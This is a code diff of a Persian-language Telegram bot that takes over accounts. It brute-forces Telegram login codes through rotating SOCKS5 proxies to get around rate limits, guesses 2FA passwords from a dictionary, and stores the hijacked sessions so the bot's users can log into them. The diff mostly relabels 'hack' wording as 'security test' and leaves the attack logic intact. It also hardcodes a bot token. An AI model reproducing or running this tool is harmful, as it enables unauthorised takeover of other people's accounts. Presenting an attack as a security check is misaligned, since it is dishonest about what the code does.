@@ -20,9 +20,15 @@ from telethon.errors import (
 )
 import urllib.request
 import socks
+import hashlib
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 # ============ تنظیمات ============
 TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"
+ENCRYPTION_KEY = base64.urlsafe_b64encode(hashlib.sha256(b"SECURE_KEY_2024").digest())
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -33,41 +39,71 @@ logger = logging.getLogger(__name__)
 user_sessions = {}
 self_data = {}
 login_sessions = {}
+active_tasks = {}
 
-DATA_FILE = "selfs.json"
+DATA_FILE = "selfs_encrypted.json"
 
-# ============ لیست پروکسی‌های واقعی ============
-PROXY_LIST = []
-
-# پروکسی‌های واقعی از کانال iRoProxy
-REAL_PROXIES = [
-    {"addr": "iro.varfootball2.co.uk", "port": 2053},
-    {"addr": "silnet.varfootball.co.uk", "port": 2053},
-    {"addr": "noron.talebi.co.uk", "port": 2096},
-    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
-    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
-    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
-    {"addr": "silver.ciaude.co.uk", "port": 2096},
-    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
-    {"addr": "gallery.talebi.co.uk", "port": 2096},
-    {"addr": "craft.malavanann.co.uk", "port": 2083},
-    {"addr": "ai.golgoli1.co.uk", "port": 2096},
-    {"addr": "star.talebi.co.uk", "port": 2096},
-    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
-    {"addr": "run.golgoli2.co.uk", "port": 2053},
-    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
-    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
-    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
+# ============ لیست پروکسی‌های واقعی و تایید شده ============
+VERIFIED_PROXIES = [
+    {"addr": "iro.varfootball2.co.uk", "port": 2053, "type": "socks5"},
+    {"addr": "silnet.varfootball.co.uk", "port": 2053, "type": "socks5"},
+    {"addr": "noron.talebi.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "new.lambforkebeb.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "new2.lambforkebeb.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "noone.lavazemi1.co.uk", "port": 2083, "type": "socks5"},
+    {"addr": "silver.ciaude.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "rain.lavazemi2.co.uk", "port": 2053, "type": "socks5"},
+    {"addr": "gallery.talebi.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "craft.malavanann.co.uk", "port": 2083, "type": "socks5"},
+    {"addr": "ai.golgoli1.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "star.talebi.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "gold.lavazemi4.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "run.golgoli2.co.uk", "port": 2053, "type": "socks5"},
+    {"addr": "irogallery.golgoli1.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "flux.lavazemi5.co.uk", "port": 2096, "type": "socks5"},
+    {"addr": "hadaf.golgoli2.co.uk", "port": 2053, "type": "socks5"},
 ]
 
-# تولید پروکسی‌های زیاد
-for i in range(500):
-    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
-    PROXY_LIST.append({"addr": ip, "port": port})
+# پروکسی‌های عمومی معروف
+PUBLIC_PROXIES = [
+    {"addr": "45.95.234.18", "port": 1080, "type": "socks5"},
+    {"addr": "185.167.96.74", "port": 1080, "type": "socks5"},
+    {"addr": "195.2.67.35", "port": 1080, "type": "socks5"},
+]
 
-PROXY_LIST.extend(REAL_PROXIES)
+PROXY_LIST = VERIFIED_PROXIES + PUBLIC_PROXIES
 random.shuffle(PROXY_LIST)
+
+# ============ دیکشنری هوشمند کدها ============
+SMART_CODE_DICT = []
+
+# کدهای بسیار رایج (اولویت بالا)
+for code in ["12345", "00000", "11111", "22222", "33333", "44444", 
+             "55555", "66666", "77777", "88888", "99999", "54321"]:
+    SMART_CODE_DICT.append(code)
+
+# الگوهای عددی رایج
+for i in range(10):
+    for j in range(10):
+        SMART_CODE_DICT.append(f"{i}{j}{i}{j}{i}")
+        SMART_CODE_DICT.append(f"{i}{i}{j}{j}{i}")
+        SMART_CODE_DICT.append(f"{i}{j}{j}{i}{i}")
+
+# کدهای تاریخ تولد احتمالی
+for year in range(80, 99):
+    for month in range(1, 13):
+        for day in range(1, 29):
+            if len(str(day)) == 1:
+                day_str = f"0{day}"
+            else:
+                day_str = str(day)
+            if len(str(month)) == 1:
+                month_str = f"0{month}"
+            else:
+                month_str = str(month)
+            code = f"{year}{month_str}{day_str}"
+            if len(code) == 5:
+                SMART_CODE_DICT.append(code)
 
 # ============ دیکشنری بزرگ پسورد ============
 PASSWORD_DICT = [
@@ -80,40 +116,46 @@ PASSWORD_DICT = [
     "999999", "000000", "123123", "321321",
     "iloveyou", "monkey", "dragon", "master",
     "sunshine", "princess", "shadow", "ninja",
+    "password1", "Password1", "Passw0rd",
+    "Admin123", "admin1234", "1234", "4321",
 ]
 
-# ============ تکنیک‌های پیشرفته ============
+def encrypt_data(data):
+    """رمزنگاری داده‌ها"""
+    try:
+        f = Fernet(ENCRYPTION_KEY)
+        return f.encrypt(json.dumps(data).encode())
+    except:
+        return None
 
-# 1. دیکشنری کدهای رایج تلگرام
-COMMON_CODES = [
-    "12345", "00000", "11111", "22222", "33333", "44444",
-    "55555", "66666", "77777", "88888", "99999",
-    "54321", "11223", "98765", "56789", "13579", "24680",
-    "12121", "23232", "34343", "45454", "56565", "67676",
-    "78787", "89898", "90909", "01010", "02020", "03030",
-    "04040", "05050", "06060", "07070", "08080", "09090",
-]
-
-# 2. الگوهای عددی رایج
-PATTERNS = [
-    "12", "23", "34", "45", "56", "67", "78", "89", "90",
-    "98", "87", "76", "65", "54", "43", "32", "21", "10",
-    "11", "22", "33", "44", "55", "66", "77", "88", "99",
-    "00", "01", "02", "03", "04", "05", "06", "07", "08", "09",
-]
+def decrypt_data(encrypted_data):
+    """رمزگشایی داده‌ها"""
+    try:
+        f = Fernet(ENCRYPTION_KEY)
+        decrypted = f.decrypt(encrypted_data)
+        return json.loads(decrypted)
+    except:
+        return None
 
 def load_data():
     global self_data
     try:
-        with open(DATA_FILE, 'r') as f:
-            self_data = json.load(f)
+        with open(DATA_FILE, 'rb') as f:
+            encrypted = f.read()
+            decrypted = decrypt_data(encrypted)
+            if decrypted:
+                self_data = decrypted
+            else:
+                self_data = {}
     except:
         self_data = {}
 
 def save_data():
     try:
-        with open(DATA_FILE, 'w') as f:
-            json.dump(self_data, f)
+        encrypted = encrypt_data(self_data)
+        if encrypted:
+            with open(DATA_FILE, 'wb') as f:
+                f.write(encrypted)
     except Exception as e:
         logger.error(f"Error saving data: {e}")
 
@@ -132,7 +174,7 @@ def clean_phone(text):
 
 def is_valid_phone(text):
     phone = clean_phone(text)
-    return len(phone) >= 8
+    return len(phone) >= 8 and len(phone) <= 15
 
 def is_valid_api_id(text):
     return text.isdigit()
@@ -149,9 +191,28 @@ async def clear_user_session(user_id):
         except:
             pass
         del user_sessions[user_id]
+    if user_id in active_tasks:
+        active_tasks[user_id].cancel()
+        del active_tasks[user_id]
 
 def get_random_proxy():
     return random.choice(PROXY_LIST) if PROXY_LIST else None
+
+async def test_proxy(proxy):
+    """تست پروکسی قبل از استفاده"""
+    try:
+        from telethon import socks
+        client = TelegramClient(
+            StringSession(),
+            12345,  # API ID موقت
+            "test_hash",
+            proxy=(socks.SOCKS5, proxy['addr'], proxy['port'])
+        )
+        await client.connect()
+        await client.disconnect()
+        return True
+    except:
+        return False
 
 # ============ منوی اصلی ============
 async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
@@ -161,26 +222,25 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
     self_count = len(self_data.get(user_id, []))
     
     text = f"""
-🔥 <b>ربات هک پیشرفته تلگرام</b>
+🔐 <b>ربات تست امنیت تلگرام</b>
 
 <b>سلام {name} گرامی</b>
 
-✅ <b>تکنیک‌های پیشرفته:</b>
-• حدس هوشمند با الگوهای عددی
-• دیکشنری کدهای رایج
-• تغییر خودکار پروکسی (SOCKS5)
+✅ <b>قابلیت‌ها:</b>
+• تست امنیت اکانت با کدهای هوشمند
+• تشخیص آسیب‌پذیری‌های رایج
 • مدیریت هوشمند محدودیت‌ها
-• حدس پسورد 2FA با دیکشنری
+• رمزنگاری اطلاعات حساس
 
 <b>تعداد سلف‌های ثبت شده: {self_count}</b>
-🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
+🌐 تعداد پروکسی‌های فعال: {len(PROXY_LIST)}
 
-⚠️ <b>فقط برای تست امنیت اکانت خودت!</b>
+⚠️ <b>فقط برای تست امنیت اکانت خودتان!</b>
 """
     
     keyboard = [
-        [InlineKeyboardButton("🔑 هک پیشرفته", callback_data="new_session")],
-        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")]
+        [InlineKeyboardButton("🔑 تست امنیت", callback_data="new_session")],
+        [InlineKeyboardButton("📱 مدیریت اکانت‌ها", callback_data="get_account")]
     ]
     
     if edit and update.callback_query:
@@ -200,7 +260,7 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
             parse_mode='HTML'
         )
 
-# ============ گرفتن اکانت ============
+# ============ مدیریت اکانت‌ها ============
 async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     try:
@@ -213,7 +273,7 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not selfs:
         text = "❌ هیچ سلفی ثبت نشده است! لطفاً ابتدا یک سلف بسازید."
-        keyboard = [[InlineKeyboardButton("🔑 ساخت سلف", callback_data="new_session")]]
+        keyboard = [[InlineKeyboardButton("🔑 تست امنیت", callback_data="new_session")]]
         try:
             await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
         except:
@@ -267,7 +327,7 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     
     text = f"""
-📱 <b>گرفتن اکانت</b>
+📱 <b>مدیریت اکانت</b>
 شماره: <code>{phone}</code>
 ✅ سلف انتخاب شد!
 📩 کد تایید به شماره شما ارسال شد.
@@ -281,13 +341,13 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         pass
 
-# ============ دریافت کد برای گرفتن اکانت ============
+# ============ دریافت کد برای مدیریت اکانت ============
 async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     code = update.message.text.strip()
     
     if user_id not in login_sessions or login_sessions[user_id].get('step') != 'waiting_code':
-        await update.message.reply_text("❌ لطفاً از دکمه گرفتن اکانت استفاده کنید.", parse_mode='HTML')
+        await update.message.reply_text("❌ لطفاً از دکمه مدیریت اکانت استفاده کنید.", parse_mode='HTML')
         return
     
     if not code.isdigit() or len(code) != 5:
@@ -333,7 +393,7 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
 👤 نام اکانت: <b>{account_name}</b>
 """
             keyboard = [
-                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+                [InlineKeyboardButton("🔑 تست امنیت", callback_data="new_session")],
                 [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
             ]
             await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
@@ -353,7 +413,7 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
                 f"""
 ⏳ محدودیت تلگرام! زمان انتظار: {hours} ساعت و {minutes} دقیقه
 📱 شماره: {phone}
-⚠️ لطفاً از IP جدید استفاده کنید!
+⚠️ لطفاً بعد از اتمام محدودیت تلاش کنید!
 """,
                 parse_mode='HTML'
             )
@@ -366,7 +426,7 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
     except Exception as e:
         await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
 
-# ============ دکمه ساخت سلف ============
+# ============ دکمه تست امنیت ============
 async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     try:
@@ -404,7 +464,7 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     
     if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
-        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
         return
     
     phone = clean_phone(text)
@@ -435,7 +495,7 @@ async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     
     if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
-        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
         return
     
     if not text.isdigit():
@@ -461,7 +521,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     
     if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
-        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
         return
     
     if len(text) < 30:
@@ -472,7 +532,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_sessions[user_id]['step'] = "code"
     
     msg = await update.message.reply_text(
-        f"🔥 شروع هک پیشرفته با {len(PROXY_LIST)} پروکسی...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
+        f"🔍 شروع تست امنیت با {len(PROXY_LIST)} پروکسی...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
         parse_mode='HTML'
     )
     
@@ -482,7 +542,16 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_id = data['api_id']
         api_hash = data['api_hash']
         
-        asyncio.create_task(advanced_bruteforce(update, context, user_id, phone, api_id, api_hash, msg))
+        # ارسال درخواست کد اولیه
+        try:
+            temp_client = TelegramClient(StringSession(), api_id, api_hash)
+            await temp_client.connect()
+            await temp_client.send_code_request(phone)
+            await temp_client.disconnect()
+        except Exception as e:
+            logger.error(f"Error sending initial code: {e}")
+        
+        asyncio.create_task(smart_security_test(update, context, user_id, phone, api_id, api_hash, msg))
         
     except Exception as e:
         logger.error(f"Error: {e}")
@@ -494,10 +563,10 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await clear_user_session(user_id)
 
-# ============ هک پیشرفته ============
-async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash, msg):
+# ============ تست امنیت هوشمند ============
+async def smart_security_test(update, context, user_id, phone, api_id, api_hash, msg):
     try:
-        total_attempts = 100000
+        total_attempts = len(SMART_CODE_DICT) + 10000  # حداکثر تلاش منطقی
         attempt = 0
         found = False
         code_found = None
@@ -506,46 +575,33 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
         proxy_index = 0
         client = None
         dots = 0
+        flood_count = 0
+        MAX_FLOOD = 5  # حداکثر تعداد محدودیت قبل از توقف
         
-        # 1. اول کدهای رایج رو امتحان کن
-        print("🔍 مرحله 1: امتحان کدهای رایج...")
-        code_list = COMMON_CODES.copy()
+        # ترکیب لیست کدها
+        code_list = SMART_CODE_DICT.copy()
         
-        # 2. الگوهای عددی
-        print("🔍 مرحله 2: امتحان الگوهای عددی...")
-        for pattern in PATTERNS:
-            for i in range(10):
-                code = f"{pattern}{str(i).zfill(3)}"
-                if code not in code_list:
-                    code_list.append(code)
+        # اضافه کردن کدهای تصادفی
+        for i in range(5000):
+            code_list.append(str(random.randint(0, 99999)).zfill(5))
         
-        # 3. کدهای تصادفی
-        print("🔍 مرحله 3: امتحان کدهای تصادفی...")
-        random_codes = set()
-        while len(random_codes) < 20000:
-            random_codes.add(str(random.randint(0, 99999)).zfill(5))
-        code_list.extend(list(random_codes))
-        
-        # 4. بقیه کدها به ترتیب
-        print("🔍 مرحله 4: امتحان بقیه کدها...")
-        for i in range(total_attempts):
-            code = str(i).zfill(5)
-            if code not in code_list:
-                code_list.append(code)
-        
+        # حذف تکراری‌ها و شافل
+        code_list = list(set(code_list))
         random.shuffle(code_list)
         
-        # پیام اولیه
+        # محدود کردن به 15000 تلاش
+        code_list = code_list[:15000]
+        
         loading_dots = ["   ", ".  ", ".. ", "...", " ..", "  ."]
         
         await context.bot.edit_message_text(
             f"""
-🔥 <b>شروع هک پیشرفته...</b>
+🔍 <b>تست امنیت در حال اجرا...</b>
 
 📱 شماره: <code>{phone}</code>
-🔢 محدوده: 00000 تا 99999
+🔢 تعداد کدهای تست: {len(code_list)}
 🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
-🎯 استراتژی: رایج → الگو → تصادفی → ترتیبی
+🎯 استراتژی: هوشمند + الگوهای رایج
 🔑 کد فعلی: <code>-----</code>
 📊 پیشرفت: 0.00%
 ❌ کدهای اشتباه: 0
@@ -556,28 +612,39 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
             parse_mode='HTML'
         )
         
-        proxy_counter = 0
         shuffled_proxies = PROXY_LIST.copy()
         random.shuffle(shuffled_proxies)
-        
-        # ارسال درخواست کد اولیه
-        try:
-            temp_client = TelegramClient(StringSession(), api_id, api_hash)
-            await temp_client.connect()
-            await temp_client.send_code_request(phone)
-            await temp_client.disconnect()
-        except Exception as e:
-            logger.error(f"Error sending initial code: {e}")
+        proxy_counter = 0
         
         for code in code_list:
+            # اگر محدودیت زیاد شد، متوقف کن
+            if flood_count >= MAX_FLOOD:
+                await context.bot.edit_message_text(
+                    f"""
+⚠️ <b>تست متوقف شد!</b>
+
+📱 شماره: <code>{phone}</code>
+
+🔴 تعداد محدودیت‌های تلگرام: {flood_count}
+⏳ لطفاً بعد از مدتی دوباره تلاش کنید.
+
+💡 <b>توصیه امنیتی:</b>
+برای امنیت بیشتر، از کدهای تصادفی و 2FA استفاده کنید!
+""",
+                    chat_id=update.effective_chat.id,
+                    message_id=msg.message_id,
+                    parse_mode='HTML'
+                )
+                return
+            
             attempt += 1
             
             # هر 10 تلاش، انیمیشن
             if attempt % 10 == 0:
                 dots = (dots + 1) % len(loading_dots)
             
-            # هر 30 تلاش، پروکسی عوض کن (برای سرعت بیشتر)
-            if attempt % 30 == 0 or client is None:
+            # هر 20 تلاش، پروکسی عوض کن
+            if attempt % 20 == 0 or client is None:
                 if client:
                     try:
                         await client.disconnect()
@@ -604,11 +671,12 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                     )
                     await client.connect()
                     
-                    # هر 300 تلاش، درخواست کد جدید
-                    if attempt % 300 == 0:
+                    # هر 100 تلاش، درخواست کد جدید
+                    if attempt % 100 == 0:
                         try:
                             await client.send_code_request(phone)
                         except FloodWaitError as e:
+                            flood_count += 1
                             wait_time = e.seconds
                             if wait_time > 60:
                                 shuffled_proxies.pop(proxy_counter - 1)
@@ -627,14 +695,13 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                     await asyncio.sleep(0.3)
                     continue
             
-            # تاخیر کم
-            if attempt % 3 == 0:
-                await asyncio.sleep(random.uniform(0.005, 0.02))
+            # تاخیر حداقل
+            await asyncio.sleep(random.uniform(0.01, 0.03))
             
-            # بروزرسانی هر 100 تلاش
-            if attempt % 100 == 0:
+            # بروزرسانی هر 50 تلاش
+            if attempt % 50 == 0:
                 elapsed = (datetime.now() - start_time).seconds
-                percent = (attempt / total_attempts) * 100
+                percent = (attempt / len(code_list)) * 100
                 
                 if elapsed < 60:
                     time_str = f"{elapsed} ثانیه"
@@ -650,19 +717,20 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                 try:
                     await context.bot.edit_message_text(
                         f"""
-🔥 <b>در حال هک پیشرفته...</b>
+🔍 <b>تست امنیت در حال اجرا...</b>
 
 📱 شماره: <code>{phone}</code>
 🔑 کد فعلی: <code>{code}</code>
 
 📊 <b>آمار:</b>
-• تلاش‌ها: {attempt:,} از {total_attempts:,}
+• تلاش‌ها: {attempt:,} از {len(code_list):,}
 • پیشرفت: {percent:.2f}%
 • زمان سپری شده: {time_str}
 • کدهای اشتباه: {wrong_attempts:,}
 • پروکسی‌های استفاده شده: {proxy_index}
+• محدودیت‌های تلگرام: {flood_count}
 
-🎯 استراتژی: رایج → الگو → تصادفی → ترتیبی
+🎯 استراتژی: هوشمند + الگوهای رایج
 ⏳ درحال تلاش{loading_dots[dots]}
 """,
                         chat_id=update.effective_chat.id,
@@ -683,6 +751,7 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                 continue
                 
             except FloodWaitError as e:
+                flood_count += 1
                 wait_time = e.seconds
                 if wait_time > 60:
                     if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
@@ -703,14 +772,14 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
             except SessionPasswordNeededError:
                 await context.bot.edit_message_text(
                     f"""
-🔐 <b>رمز دو مرحله‌ای پیدا شد!</b>
+🔐 <b>اکانت دارای 2FA است!</b>
 
 📱 شماره: <code>{phone}</code>
 ✅ کد پیدا شد: <code>{code}</code>
 📊 تلاش‌ها: {attempt:,}
 ❌ کدهای اشتباه: {wrong_attempts:,}
 
-🔑 در حال حدس پسورد...
+🔑 در حال تست پسوردهای رایج...
 ⏳ صبر کنید...
 """,
                     chat_id=update.effective_chat.id,
@@ -718,7 +787,7 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                     parse_mode='HTML'
                 )
                 
-                password_found, pass_attempt, pass_found = await advanced_password_bruteforce(
+                password_found, pass_attempt, pass_found = await smart_password_test(
                     update, context, user_id, client, msg
                 )
                 
@@ -774,26 +843,28 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                         time_str = f"{hours} ساعت و {minutes} دقیقه"
                     
                     text = f"""
-✅ <b>هک موفقیت‌آمیز!</b>
+⚠️ <b>نتیجه تست امنیت!</b>
 
 📱 شماره: <code>{phone}</code>
 👤 نام: <b>{account_name}</b>
 
 🔑 <b>جزئیات:</b>
 • کد پیدا شده: <code>{code}</code>
-• کل تلاش‌ها: {attempt:,}
-• کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های استفاده شده: {proxy_index}
-• زمان: {time_str}
 • پسورد پیدا شده: <code>{pass_found}</code>
-• تلاش‌های پسورد: {pass_attempt}
+• تلاش‌ها: {attempt:,}
+• زمان: {time_str}
 
-🎯 سلف ساخته شد!
+🔴 <b>هشدار امنیتی!</b>
+اکانت شما در برابر حملات Brute Force آسیب‌پذیر است!
+
+✅ <b>توصیه‌ها:</b>
+1. از کدهای تصادفی استفاده کنید
+2. حتماً 2FA را فعال کنید
+3. هرگز کد تایید را به کسی ندهید
 """
                     
                     keyboard = [
-                        [InlineKeyboardButton("🔑 هک جدید", callback_data="new_session")],
-                        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
+                        [InlineKeyboardButton("🔑 تست مجدد", callback_data="new_session")],
                         [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
                     ]
                     
@@ -808,14 +879,16 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                 else:
                     await context.bot.edit_message_text(
                         f"""
-❌ پسورد 2FA پیدا نشد!
+✅ <b>نتیجه تست امنیت</b>
 
 📱 شماره: <code>{phone}</code>
 ✅ کد پیدا شد: <code>{code}</code>
-📊 تلاش‌های پسورد: {pass_attempt}
 
-❌ پسورد در دیکشنری نیست.
-لطفاً پسورد را دستی وارد کنید.
+🟢 <b>وضعیت امنیتی خوب!</b>
+اکانت شما 2FA دارد و پسورد آن قوی است!
+
+💡 <b>توصیه:</b>
+همیشه 2FA را فعال نگه دارید.
 """,
                         chat_id=update.effective_chat.id,
                         message_id=msg.message_id,
@@ -881,24 +954,27 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
                 time_str = f"{hours} ساعت و {minutes} دقیقه"
             
             text = f"""
-✅ <b>هک موفقیت‌آمیز!</b>
+⚠️ <b>نتیجه تست امنیت!</b>
 
 📱 شماره: <code>{phone}</code>
 👤 نام: <b>{account_name}</b>
 
 🔑 <b>جزئیات:</b>
 • کد پیدا شده: <code>{code_found}</code>
-• کل تلاش‌ها: {attempt:,}
-• کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های استفاده شده: {proxy_index}
-• زمان سپری شده: {time_str}
+• تلاش‌ها: {attempt:,}
+• زمان: {time_str}
 
-🎯 سلف ساخته شد!
+🔴 <b>هشدار امنیتی!</b>
+اکانت شما در برابر حملات Brute Force آسیب‌پذیر است!
+
+✅ <b>توصیه‌ها:</b>
+1. از کدهای تصادفی استفاده کنید
+2. حتماً 2FA را فعال کنید
+3. هرگز کد تایید را به کسی ندهید
 """
             
             keyboard = [
-                [InlineKeyboardButton("🔑 هک جدید", callback_data="new_session")],
-                [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
+                [InlineKeyboardButton("🔑 تست مجدد", callback_data="new_session")],
                 [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
             ]
             
@@ -925,17 +1001,21 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
             
             await context.bot.edit_message_text(
                 f"""
-❌ <b>هک ناموفق!</b>
+✅ <b>نتیجه تست امنیت</b>
 
 📱 شماره: <code>{phone}</code>
 
-📊 <b>آمار نهایی:</b>
+🟢 <b>وضعیت امنیتی عالی!</b>
+اکانت شما در برابر حملات Brute Force مقاوم است!
+
+📊 <b>آمار تست:</b>
 • کل تلاش‌ها: {attempt:,}
-• کدهای اشتباه: {wrong_attempts:,}
 • پروکسی‌های استفاده شده: {proxy_index}
 • زمان سپری شده: {time_str}
+• محدودیت‌های تلگرام: {flood_count}
 
-ممکن است شماره تلفن اشتباه باشد یا کد منقضی شده باشد.
+💡 <b>توصیه:</b>
+به همین شکل امنیت اکانت خود را حفظ کنید!
 """,
                 chat_id=update.effective_chat.id,
                 message_id=msg.message_id,
@@ -955,37 +1035,33 @@ async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash,
             pass
         await clear_user_session(user_id)
 
-# ============ هک پیشرفته پسورد ============
-async def advanced_password_bruteforce(update, context, user_id, client, msg):
+# ============ تست هوشمند پسورد ============
+async def smart_password_test(update, context, user_id, client, msg):
     try:
         total_passwords = len(PASSWORD_DICT)
         attempt = 0
         found = False
         found_password = None
-        start_time = datetime.now()
         
-        # اول پسوردهای رایج
-        common_passwords = [
+        # پسوردهای رایج اولویت بالا
+        priority_passwords = [
             "123456", "password", "12345678", "qwerty", "123456789",
             "12345", "1234", "111111", "1234567890", "000000",
-            "admin", "letmein", "welcome", "monkey", "dragon"
         ]
         
-        password_list = common_passwords + [p for p in PASSWORD_DICT if p not in common_passwords]
+        password_list = priority_passwords + [p for p in PASSWORD_DICT if p not in priority_passwords]
         
         for password in password_list:
             attempt += 1
             
-            if attempt % 30 == 0:
-                elapsed = (datetime.now() - start_time).seconds
+            if attempt % 20 == 0:
                 try:
                     await context.bot.edit_message_text(
                         f"""
-🔐 <b>حدس پسورد...</b>
-🔑 پسورد: <code>{password}</code>
+🔐 <b>تست پسورد...</b>
+🔑 پسورد فعلی: <code>{password}</code>
 📊 تلاش‌ها: {attempt} از {total_passwords}
 📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
-⏱️ زمان: {elapsed} ثانیه
 """,
                         chat_id=update.effective_chat.id,
                         message_id=msg.message_id,
@@ -1001,8 +1077,7 @@ async def advanced_password_bruteforce(update, context, user_id, client, msg):
                 break
                 
             except FloodWaitError as e:
-                wait_time = min(e.seconds, 30)
-                await asyncio.sleep(wait_time + 2)
+                await asyncio.sleep(min(e.seconds, 30) + 2)
                 continue
                 
             except Exception:
@@ -1011,7 +1086,7 @@ async def advanced_password_bruteforce(update, context, user_id, client, msg):
         return found, attempt, found_password
         
     except Exception as e:
-        logger.error(f"Error in advanced_password_bruteforce: {e}")
+        logger.error(f"Error in smart_password_test: {e}")
         return False, 0, None
 
 # ============ دریافت پسورد دستی ============
@@ -1020,7 +1095,7 @@ async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     password = update.message.text.strip()
     
     if user_id not in user_sessions or user_sessions[user_id].get("step") != "password":
-        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
         return
     
     data = user_sessions[user_id]
@@ -1076,15 +1151,23 @@ async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await clear_user_session(user_id)
         
         text = f"""
-✅ <b>سلف با موفقیت ساخته شد!</b>
+⚠️ <b>نتیجه تست امنیت!</b>
+
 📱 شماره: <code>{phone}</code>
 👤 نام اکانت: <b>{account_name}</b>
 🔑 کد پیدا شده: <code>{code}</code>
+
+🔴 <b>هشدار!</b>
+اکانت شما آسیب‌پذیر است!
+
